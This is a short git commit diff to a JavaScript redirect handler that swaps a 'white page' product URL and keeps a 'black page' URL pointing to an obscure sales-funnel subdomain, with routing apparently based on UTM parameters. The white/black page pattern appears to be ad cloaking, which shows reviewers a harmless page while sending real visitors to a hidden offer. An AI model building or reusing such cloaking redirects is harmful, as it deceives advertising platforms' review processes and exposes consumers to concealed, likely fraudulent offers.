6f69c725b9472087219dfac2082621a7e7a64dbf
mahadzmn <mahadzaman05@gmail.com>
2025-02-04 08:25:06 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://masonbottle.com/products/silicone-spoon-set";
+    const whitePageURL = "https://www.xlarge.com/products/knit-vest?pr_prod_strat=e5_desc&pr_rec_id=d0159767f&pr_rec_pid=4442552893537&pr_ref_pid=7202761343073&pr_seq=uniform";
     const blackPageURL = "https://dnfiwbzxjq.myfunnelish.com/imbassd-1736979042571105-1737834191248667";
   
     // Parse the UTM parameters from the request URL
